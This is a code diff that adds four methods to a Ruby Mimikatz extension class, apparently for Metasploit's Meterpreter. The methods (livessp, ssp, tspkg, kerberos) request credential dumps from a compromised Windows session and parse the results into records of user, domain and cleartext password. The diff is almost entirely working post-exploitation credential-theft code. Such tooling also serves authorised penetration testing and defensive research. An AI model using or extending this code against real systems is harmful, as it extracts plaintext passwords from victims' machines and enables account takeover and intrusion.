@@ -72,6 +72,86 @@ class Mimikatz < Extension
                 end
                 return accounts
 	end
+
+        def livessp
+                request = Packet.create_request('mimikatz_livessp')
+                response = client.send_request(request)
+                result = Rex::Text.to_ascii(response.get_tlv_value(TLV_TYPE_MIMIKATZ_RESULT))
+
+                details = CSV.parse(result)
+                accounts  =  []
+                details.each do |acc|
+                        account = {
+                                :authid => acc[0],
+                                :package => acc[1],
+                                :user => acc[2],
+                                :domain => acc[3],
+                                :password => acc[4]
+                        }
+                        accounts << account
+                end
+                return accounts
+        end
+
+        def ssp
+                request = Packet.create_request('mimikatz_ssp')
+                response = client.send_request(request)
+                result = Rex::Text.to_ascii(response.get_tlv_value(TLV_TYPE_MIMIKATZ_RESULT))
+
+                details = CSV.parse(result)
+                accounts  =  []
+                details.each do |acc|
+                        account = {
+                                :authid => acc[0],
+                                :package => acc[1],
+                                :user => acc[2],
+                                :domain => acc[3],
+                                :password => acc[4]
+                        }
+                        accounts << account
+                end
+                return accounts
+        end
+
+        def tspkg
+                request = Packet.create_request('mimikatz_tspkg')
+                response = client.send_request(request)
+                result = Rex::Text.to_ascii(response.get_tlv_value(TLV_TYPE_MIMIKATZ_RESULT))
+
+                details = CSV.parse(result)
+                accounts  =  []
+                details.each do |acc|
+                        account = {
+                                :authid => acc[0],
+                                :package => acc[1],
+                                :user => acc[2],
+                                :domain => acc[3],
+                                :password => acc[4]
+                        }
+                        accounts << account
+                end
+                return accounts
+        end
+
+        def kerberos
+                request = Packet.create_request('mimikatz_kerberos')
+                response = client.send_request(request)
+                result = Rex::Text.to_ascii(response.get_tlv_value(TLV_TYPE_MIMIKATZ_RESULT))
+
+                details = CSV.parse(result)
+                accounts  =  []
+                details.each do |acc|
+                        account = {
+                                :authid => acc[0],
+                                :package => acc[1],
+                                :user => acc[2],
+                                :domain => acc[3],
+                                :password => acc[4]
+                        }
+                        accounts << account
+                end
+                return accounts
+        end
 end
 
 end; end; end; end; end
